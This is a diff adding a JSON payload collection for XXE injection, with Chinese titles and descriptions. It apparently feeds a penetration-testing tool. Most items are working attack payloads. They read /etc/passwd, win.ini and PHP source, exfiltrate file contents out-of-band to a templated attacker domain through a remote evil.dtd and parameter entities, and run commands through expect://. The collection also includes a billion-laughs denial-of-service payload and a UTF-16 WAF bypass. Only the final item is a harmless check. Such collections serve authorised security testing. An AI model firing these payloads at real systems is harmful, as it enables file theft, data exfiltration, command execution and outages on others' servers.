@@ -1,0 +1,140 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "XXE 外部实体注入",
+  "categories": ["基础读取", "盲打带外", "参数实体", "协议与扩展", "防御验证"],
+  "items": [
+    {
+      "id": "xxe-file-read",
+      "title": "读取本地文件",
+      "category": "基础读取",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>",
+      "desc": "定义外部实体指向本地文件，并在文档中引用，验证是否存在 XXE。",
+      "tags": ["xxe", "file", "basic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP XXE Prevention Cheat Sheet"
+    },
+    {
+      "id": "xxe-php-filter",
+      "title": "php://filter 读源码",
+      "category": "基础读取",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]>\n<root>&xxe;</root>",
+      "desc": "Base64 编码后读取 PHP 源码，避免特殊字符破坏 XML 结构。",
+      "tags": ["xxe", "php", "source"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP XXE Prevention Cheat Sheet"
+    },
+    {
+      "id": "xxe-windows-file",
+      "title": "读取 Windows 文件",
+      "category": "基础读取",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>\n<root>&xxe;</root>",
+      "desc": "Windows 目标的基础验证，确认实体解析可用。",
+      "tags": ["xxe", "windows"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP XXE Prevention Cheat Sheet"
+    },
+    {
+      "id": "xxe-http-oob",
+      "title": "HTTP 带外请求",
+      "category": "盲打带外",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://{{domain}}/xxe\">]>\n<root>&xxe;</root>",
+      "desc": "无回显时，用外部实体发起 HTTP 请求，通过 DNSLog 确认漏洞。",
+      "tags": ["xxe", "blind", "oob"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "OWASP XXE Prevention Cheat Sheet"
+    },
+    {
+      "id": "xxe-ftp-oob",
+      "title": "FTP 带外外带文件",
+      "category": "盲打带外",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://{{domain}}/evil.dtd\">\n%dtd;]>\n<root/>",
+      "desc": "加载远程 DTD，由 evil.dtd 内定义 %file 与 FTP 外带实体，把文件内容带出，适合无回显场景。",
+      "tags": ["xxe", "blind", "ftp", "oob"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "OWASP XXE Prevention Cheat Sheet"
+    },
+    {
+      "id": "xxe-parameter-entity",
+      "title": "参数实体外带",
+      "category": "参数实体",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://{{domain}}/?x=%file;'>\">\n%eval;\n%exfil;]>\n<root/>",
+      "desc": "利用参数实体在 DTD 中拼接 URL，将文件内容编码后带出。",
+      "tags": ["xxe", "parameter-entity", "oob"],
+      "vars": ["domain"],
+      "risk": "attack",
+      "source": "OWASP XXE Prevention Cheat Sheet"
+    },
+    {
+      "id": "xxe-utf16-bypass",
+      "title": "UTF-16 编码绕过",
+      "category": "参数实体",
+      "code": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>",
+      "desc": "部分 WAF 只检测 UTF-8 关键字，切换编码可能绕过。",
+      "tags": ["xxe", "bypass", "waf", "encoding"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 WAF 绕过研究"
+    },
+    {
+      "id": "xxe-expect-rce",
+      "title": "expect 扩展执行命令",
+      "category": "协议与扩展",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"expect://id\">]>\n<root>&xxe;</root>",
+      "desc": "当 PHP 安装 expect 扩展时可执行命令，属于高危害场景。",
+      "tags": ["xxe", "rce", "expect"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "xxe-dos-billion-laughs",
+      "title": "Billion Laughs 实体膨胀",
+      "category": "协议与扩展",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n]>\n<lolz>&lol3;</lolz>",
+      "desc": "实体递归膨胀导致内存耗尽，属于拒绝服务验证，严禁对生产系统使用。",
+      "tags": ["xxe", "dos", "danger"],
+      "vars": [],
+      "risk": "danger",
+      "source": "OWASP XXE Prevention Cheat Sheet"
+    },
+    {
+      "id": "xxe-svg-upload",
+      "title": "SVG 图片 XXE",
+      "category": "协议与扩展",
+      "code": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image xlink:href=\"file:///etc/passwd\" height=\"200\" width=\"200\"/>\n</svg>",
+      "desc": "上传 SVG 时服务端若解析 XML，可能触发 XXE 读取文件。",
+      "tags": ["xxe", "svg", "upload"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "xxe-docx-inject",
+      "title": "Office 文档注入思路",
+      "category": "协议与扩展",
+      "code": "在 [Content_Types].xml 或 document.xml 中插入 <!DOCTYPE> 与外部实体声明",
+      "desc": "Office 文档本质是 ZIP + XML，服务端解析时可能触发 XXE，需按实际结构修改。",
+      "tags": ["xxe", "office", "upload"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "xxe-safe-check",
+      "title": "安全验证：普通实体",
+      "category": "防御验证",
+      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY test \"hello\">]>\n<root>&test;</root>",
+      "desc": "仅使用内部实体，不引用外部资源。若返回 hello，说明实体解析开启，可进一步评估外部实体限制。",
+      "tags": ["xxe", "verify", "safe"],
+      "vars": [],
+      "risk": "low",
+      "source": "OWASP XXE Prevention Cheat Sheet"
+    }
+  ]
+}
